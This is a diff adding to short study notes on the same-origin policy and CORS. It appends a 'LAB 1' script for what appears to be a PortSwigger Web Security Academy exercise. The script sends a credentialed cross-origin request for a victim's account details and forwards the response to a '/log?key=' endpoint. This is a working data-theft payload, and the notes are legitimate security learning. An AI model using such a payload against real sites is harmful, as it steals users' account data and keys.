@@ -11,3 +11,20 @@ same origin policy limits a website to access contents or files outside its part
 
 CORS is used to relax the SOP in a controlled manner, so websites can able to access resources outside its domain but without causing any issues.
 
+
+### LAB 1
+
+```
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://0ad5006c03c5512b817d98b6002100b8.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location='/log?key='+this.responseText;
+    };
+</script>
+```
+
